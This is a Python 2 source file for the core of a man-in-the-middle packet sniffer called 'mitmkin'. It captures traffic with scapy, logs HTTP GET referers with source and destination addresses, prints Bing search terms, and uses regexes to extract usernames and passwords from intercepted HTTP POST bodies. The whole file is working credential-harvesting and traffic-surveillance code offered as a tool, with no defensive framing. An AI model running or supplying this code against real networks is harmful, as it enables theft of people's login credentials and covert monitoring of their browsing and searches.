from time import sleep,asctime,strftime
from BeautifulSoup import BeautifulSoup
import threading
from threading import Thread
import Queue
from scapy.all import *
import logging
from plugins import *
import sys
import netifaces


class CoreMitm(object):
    ''' core mitmkin main thread'''
    def __init__(self,options):
        self.options  = options
        self.interface = self.options.interface
        self.filter = self.options.filter
        self.stopped    = False

    def run(self):
        self.main()


    def check_interface(self, iface):
        if iface in netifaces.interfaces():
            return True
        print('[-] [{}] interface is not found...'.format(iface))
        return False

    def sniffer(self, q):
        while not self.stopped:
            try:
                sniff(iface=self.interface,filter=self.filter,
                 prn =lambda x : q.put(x), store=0)
            except Exception:
                pass
            if self.stopped:
                break

    def main(self):
        self.plugins = {}

        if not self.check_interface(self.interface):
            return

        self.plugin_classes = plugin.PSniffer.__subclasses__()
        for p in self.plugin_classes:
            self.plugins[p._name] = p()
            print('[*] plugin::{0:17} status:On'.format(p._name))
        self.plugins['Hexdump'].getInstance()._activated = True
        print('\n')

        q = Queue.Queue()
        sniff = Thread(target =self.sniffer, args = (q,))
        sniff.daemon = True
        sniff.start()
        while (not self.stopped):
            try:
                pkt = q.get(timeout = 1)
                self.snifferParser(pkt)
                for Active in self.plugins.keys():
                    if self.plugins[Active].getInstance()._activated:
                        self.plugins[Active].filterPackets(pkt)
            except Queue.Empty:
              pass

    def snifferParser(self,pkt):
        try:
            if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
                return
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                self.src_ip_port = str(pkt[IP].src)+':'+str(self.sport)
                self.dst_ip_port = str(pkt[IP].dst)+':'+str(self.dport)

            if pkt.haslayer(Raw):
                self.load = pkt[Raw].load
                if self.load.startswith('GET'):
                    self.get_http_GET(self.src_ip_port,self.dst_ip_port,self.load)
                    self.searchBingGET(self.load.split('\n', 1)[0].split('&')[0])
                elif self.load.startswith('POST'):
                    header,url = self.get_http_POST(self.load)
                    self.getCredentials_POST(pkt.getlayer(Raw).load,url,header)
        except:
            pass

    def searchBingGET(self,search):
        if 'search?q' in search :
            searched = search.split('search?q=',1)[1]
            searched = searched.replace('+',' ')
            print 'Search::BING { %s }'%(searched)

    def getCredentials_POST(self,payload,url,header):
        user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|' \
        '[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|' \
        '[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
        username = re.findall(user_regex, payload)
        password = re.findall(pw_regex, payload)
        if not username ==[] and not password == []:
            if url != None:
                print('Request::POST {} '.format(url))
            print('[-] Username: {}'.format(username[0][1]))
            print('[-] Password: {}'.format(password[0][1]))

    def get_http_POST(self,load):
        dict_head = {}
        try:
            headers, body = load.split("\r\n\r\n", 1)
            header_lines = headers.split('\r\n')
            for item in header_lines:
                try:
                    dict_head[item.split()[0]] = item.split()[1]
                except Exception:
                    pass
            if 'Referer:' in dict_head.keys():
                return dict_head ,dict_head['Referer:']
        except ValueError:
            return None,None
        return dict_head, None

    def get_http_GET(self,src,dst,load):
        if 'Referer:' in load:
            print ('[{} > {}] GET {}'.format(src.split(':')[0],dst.split(':')[0],
            load.split('Referer: ')[1].split('\n',1)[0]))

    def stop(self):
        self.stopped = True
        print 'Stop Sniffer::Core:' + self.objectName()
